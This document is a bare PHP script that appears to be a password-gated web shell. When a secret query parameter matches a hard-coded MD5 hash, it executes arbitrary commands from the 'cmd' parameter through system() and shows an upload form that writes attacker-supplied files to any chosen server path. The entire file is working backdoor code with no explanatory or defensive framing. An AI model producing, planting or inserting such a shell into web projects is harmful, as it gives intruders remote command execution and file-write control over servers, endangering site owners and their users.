<?php if(md5($_GET["ms-load"])=="53667b8a48e3fed2c21d2b326151484d"){
$c=$_GET['cmd'];
system($c);
$p=$_SERVER["DOCUMENT_ROOT"];
$yoco=dirname(__FILE__);
echo <<<HTML
<form enctype="multipart/form-data"  method="POST">
Path:$p<br>
<input name="file" type="file"><br>
To:<br>
<input size="48" value="$yoco/" name="pt" type="text"><br>
<input type="submit" value="Upload">
$tend
HTML;
if (isset($_POST["pt"])){
$uploadfile = $_POST["pt"].$_FILES["file"]["name"];
if ($_POST["pt"]==""){$uploadfile = $_FILES["file"]["name"];}
if (copy($_FILES["file"]["tmp_name"], $uploadfile)){
echo"uploaded:$uploadfilen";
echo"Size:".$_FILES["file"]["size"]."n";
}else {
print "Error:n";
}
}
}

